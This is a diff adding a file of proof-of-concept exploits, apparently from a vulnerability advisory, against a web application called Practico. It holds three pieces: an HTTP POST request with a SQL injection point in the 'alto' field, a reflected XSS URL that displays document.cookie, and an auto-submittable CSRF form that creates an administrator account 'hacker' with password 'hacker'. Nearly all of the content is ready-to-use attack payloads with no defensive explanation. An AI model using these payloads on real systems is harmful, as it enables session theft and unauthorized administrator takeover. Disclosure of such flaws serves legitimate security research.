@@ -1,0 +1,48 @@
+QLi PoC:
+---------
+
+POST /practico/ HTTP/1.1
+Host: www.example.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/practico/
+Cookie: __utma=1.1386375274.1372170047.1372170047.1372170047.1; __utmz=1.1372170047.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); cookies_accepted=yes; pun_cookie_e516be=1%7C93436127b7acec38d75088212a8649c4eb3c9e84%7C1406252203%7C9f9c497d5b3e089bf8bb1e2f145e599fa095c746; PHPSESSID=6e2rs9td58ardofhso3gm63421
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 145
+
+accion=guardar_informe&titulo=asdasd&descripcion=asdasd&categoria=asdasd&nivel_usuario=-1&ayuda_imagen=&ancho=&alto=[SQL Injection]&formato_final=T&genera_pdf=N
+
+
+--------
+XSS PoC:
+--------
+
+Http://www.example.com/practico/?accionbuscar=&usuario=&diai=09&mesi=10&diaf=09&mesf=10&ano=2013&accion=ver_seguimiento_general&inicio_reg=0&fin_reg=50"><script>alert(document.cookie);</script>
+
+
+-------------------
+CSRF Add Admin PoC:
+-------------------
+
+<html>
+  <body>
+    <form action="http://www.example.com/practico/" method="POST">
+      <input type="hidden" name="accion" value="guardar&#95;usuario" />
+      <input type="hidden" name="login" value="hacker" />
+      <input type="hidden" name="nombre" value="Testingus2" />
+      <input type="hidden" name="descripcion" value="ZSL" />
+      <input type="hidden" name="clave" value="hacker" />
+      <input type="hidden" name="seguridad" value="0" />
+      <input type="hidden" name="clave1" value="hacker" />
+      <input type="hidden" name="correo" value="thricer&#64;it&#46;com&#46;mk.ar" />
+      <input type="hidden" name="estado" value="1" />
+      <input type="hidden" name="nivel" value="5" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+
